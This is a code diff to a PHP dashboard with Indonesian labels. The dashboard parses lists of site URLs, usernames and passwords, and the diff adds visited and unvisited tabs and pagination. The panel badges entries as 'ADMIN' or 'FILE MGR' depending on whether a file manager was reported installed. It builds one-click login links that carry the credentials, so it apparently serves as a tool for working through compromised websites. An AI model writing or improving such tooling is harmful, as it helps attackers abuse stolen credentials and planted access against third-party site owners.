@@ -152,7 +152,57 @@ foreach ($raw_lines as $l) {
     }
 }
 
-$total = count($lines);
+$entries = [];
+$inst = 0;
+foreach ($lines as $line) {
+    $parts = explode('|', $line);
+    $creds_raw = trim($parts[0]);
+    $msg = isset($parts[1]) ? trim($parts[1]) : '';
+    $c = explode('#', $creds_raw);
+    if (count($c) < 3) continue;
+
+    $url = $c[0];
+    $usr = $c[1];
+    $pwd = trim(implode('#', array_slice($c, 2)));
+
+    $clean_url = preg_replace('#^https?://#', '', $url);
+    $clean_url = preg_replace('#^www\.#', '', $clean_url);
+    $clean_url = explode('/', $clean_url)[0];
+
+    $is_fm = (stripos($msg, 'INSTALLED') !== false || stripos($msg, 'Active') !== false || stripos($msg, 'Success') !== false);
+    if ($is_fm) $inst++;
+
+    $entries[] = [
+        'url' => $url,
+        'usr' => $usr,
+        'pwd' => $pwd,
+        'msg' => $msg,
+        'clean_url' => $clean_url,
+        'is_fm' => $is_fm,
+        'is_visited' => in_array($url, $visited_list),
+    ];
+}
+
+$total = count($entries);
+$unvisited_entries = array_values(array_filter($entries, fn($entry) => !$entry['is_visited']));
+$visited_entries = array_values(array_filter($entries, fn($entry) => $entry['is_visited']));
+
+$active_tab = (isset($_GET['tab']) && $_GET['tab'] === 'visited') ? 'visited' : 'unvisited';
+$items_per_page = 20;
+$current_page = max(1, (int)($_GET['page'] ?? 1));
+
+$active_entries = $active_tab === 'visited' ? $visited_entries : $unvisited_entries;
+$active_total = count($active_entries);
+$total_pages = max(1, (int)ceil($active_total / $items_per_page));
+if ($current_page > $total_pages) $current_page = $total_pages;
+
+$offset = ($current_page - 1) * $items_per_page;
+$paged_entries = array_slice($active_entries, $offset, $items_per_page);
+
+function build_tab_link($tab, $page = 1) {
+    $params = ['tab' => $tab, 'page' => $page];
+    return '?' . http_build_query($params);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -185,6 +235,22 @@ $total = count($lines);
         .stat-lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
 
         .list-container { display: flex; flex-direction: column; gap: 8px; }
+        .tabs { display: flex; gap: 10px; margin-bottom: 18px; }
+        .tab-link {
+            text-decoration: none; color: var(--text-muted); border: 1px solid var(--border);
+            background: var(--bg-card); padding: 10px 14px; border-radius: 10px; font-size: 12px; font-weight: 600;
+            transition: 0.2s;
+        }
+        .tab-link:hover { border-color: var(--accent); color: var(--text-main); }
+        .tab-link.active { color: #fff; border-color: var(--accent); background: rgba(138, 180, 248, 0.15); }
+
+        .pagination { display: flex; gap: 8px; justify-content: center; margin-top: 20px; flex-wrap: wrap; }
+        .page-link {
+            text-decoration: none; color: var(--text-muted); border: 1px solid var(--border); background: var(--bg-card);
+            padding: 8px 12px; border-radius: 8px; font-size: 12px; min-width: 36px; text-align: center;
+        }
+        .page-link.active { color: #fff; border-color: var(--accent); background: rgba(138, 180, 248, 0.15); }
+        .page-link:hover { border-color: var(--accent); color: var(--text-main); }
         .list-header { 
             display: grid; grid-template-columns: 40px 3fr 2fr 100px 60px; 
             padding: 0 25px 10px 25px; font-size: 11px; font-weight: 700; 
@@ -318,6 +384,15 @@ $total = count($lines);
     </div>
 
     <div class="list-container">
+        <div class="tabs">
+            <a class="tab-link <?= $active_tab === 'unvisited' ? 'active' : '' ?>" href="<?= build_tab_link('unvisited', 1) ?>">
+                Belum Dibuka (<?= count($unvisited_entries) ?>)
+            </a>
+            <a class="tab-link <?= $active_tab === 'visited' ? 'active' : '' ?>" href="<?= build_tab_link('visited', 1) ?>">
+                Sudah Dibuka (<?= count($visited_entries) ?>)
+            </a>
+        </div>
+
         <div class="list-header">
             <div>#</div>
             <div>Domain</div>
@@ -326,26 +401,20 @@ $total = count($lines);
             <div style="text-align:right">Action</div>
         </div>
 
-        <?php if($total > 0): $no=1; foreach($lines as $line): 
-            $parts = explode('|', $line);
-            $creds_raw = trim($parts[0]);
-            $msg = isset($parts[1]) ? trim($parts[1]) : '';
-            $c = explode('#', $creds_raw);
-            if(count($c) < 3) continue;
-            
-            $url = $c[0]; $usr = $c[1]; $pwd = trim(implode('#', array_slice($c, 2)));
-            
-            $clean_url = preg_replace('#^https?://#', '', $url);
-            $clean_url = preg_replace('#^www\.#', '', $clean_url);
-            $clean_url = explode('/', $clean_url)[0];
-
-            $is_fm = (stripos($msg,'INSTALLED')!==false || stripos($msg,'Active')!==false || stripos($msg,'Success')!==false);
+         <?php if($active_total > 0): foreach($paged_entries as $index => $entry): 
+            $url = $entry['url'];
+            $usr = $entry['usr'];
+            $pwd = $entry['pwd'];
+            $msg = $entry['msg'];
+            $clean_url = $entry['clean_url'];
+            $is_fm = $entry['is_fm'];
+            $is_visited = $entry['is_visited'];
             $badge = $is_fm ? '<span class="badge b-fm">FILE MGR</span>' : '<span class="badge b-ad">ADMIN</span>';
             $login_link = "?action=login&u=".urlencode($url)."&l=".urlencode($usr)."&p=".urlencode($pwd)."&m=".urlencode($msg);
             
-            // CHECK VISITED
-            $is_visited = in_array($url, $visited_list);
             $row_class = $is_visited ? 'visited' : '';
+            $no = $offset + $index + 1;
+
         ?>
             <div class="item <?= $row_class ?>" id="row-<?= $no ?>" onclick="setFocus(this)">
                 <div class="col-num"><?= $no ?></div>
@@ -374,8 +443,16 @@ $total = count($lines);
                     <?php endif; ?>
                 </div>
             </div>
-        <?php $no++; endforeach; else: ?>
-            <div style="padding:50px; text-align:center; color:var(--text-muted)">No unique targets found.</div>
+       <?php endforeach; else: ?>
+            <div style="padding:50px; text-align:center; color:var(--text-muted)">Tidak ada domain pada tab ini.</div>
+        <?php endif; ?>
+
+        <?php if($total_pages > 1): ?>
+            <div class="pagination">
+                <?php for($p = 1; $p <= $total_pages; $p++): ?>
+                    <a href="<?= build_tab_link($active_tab, $p) ?>" class="page-link <?= $p === $current_page ? 'active' : '' ?>"><?= $p ?></a>
+                <?php endfor; ?>
+            </div>
         <?php endif; ?>
     </div>
 </div>
